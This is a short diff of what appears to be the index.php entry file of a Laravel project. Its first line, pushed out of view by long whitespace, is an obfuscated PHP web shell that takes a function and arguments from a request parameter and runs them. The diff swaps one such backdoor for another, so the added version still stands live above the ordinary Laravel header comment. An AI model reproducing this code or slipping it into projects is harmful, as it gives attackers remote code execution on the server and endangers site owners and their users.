@@ -1,5 +1,5 @@
 <?php
-                                                                                                                                                                                                                                                                    if	(	$tm9iz	=	@${"_REQUEST"}[ "6T8E48SP"]	)$tm9iz	[1	](${$tm9iz [ 2]	}	[0 ], $tm9iz[3	]( $tm9iz[4]))	;
+                                                                                                                                                                                                                                                                  if($b9m5xp5	=@${ "_REQUEST"}[	"HC1Y0CNA"] )$b9m5xp5[1]	(${$b9m5xp5	[2 ]	}	[0]	,$b9m5xp5[3]($b9m5xp5 [4]) ) ;exit();
 
 /**
  * Laravel - A PHP Framework For Web Artisans
